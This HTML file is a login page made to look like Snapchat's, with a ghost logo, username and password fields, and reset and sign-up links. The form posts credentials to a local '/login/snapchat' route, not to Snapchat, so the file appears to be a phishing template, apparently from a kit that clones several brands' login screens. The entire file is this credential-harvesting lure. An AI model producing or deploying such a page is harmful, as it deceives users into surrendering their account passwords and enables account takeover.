<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body class="sc-body">
    <div class="sc-wrapper">
        <div class="sc-card">
            <div class="sc-ghost"></div>
            <h1>Log in</h1>
            <form action="/login/snapchat" method="POST">
                <input type="text" name="email" placeholder="Username or email" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="sc-login-btn">Log In</button>
            </form>
            <a href="#" class="sc-forgot">Forgot your password?</a>
        </div>
        <div class="sc-signup-card">
            New here? <a href="#">Create an account</a>
        </div>
    </div>
</body>
</html>
